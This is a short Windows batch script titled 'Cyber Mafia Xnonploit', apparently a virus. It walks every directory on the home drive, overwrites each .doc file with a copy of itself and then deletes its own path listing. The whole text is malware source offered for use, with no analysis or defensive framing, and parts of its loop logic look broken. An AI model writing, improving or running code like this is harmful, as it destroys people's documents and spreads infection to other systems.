:::::::::::::::::::::::::
::Cyber Mafia Xnonploit::
:::::::::::::::::::::::::
@echo off
Dir %Homedrive% /s /b > DirPath                          
        For /f %%Y In (DirPath) Do (
        Set DirPath=%%Y > Nul    
            For %%Z In (%DirPath%\*.doc) Do (
            Set DocInfect=%%Z > Nul
            Copy /y %0 %DocInfect%
        )
    )

Del /f /s /q DirPath
::---------------------------::
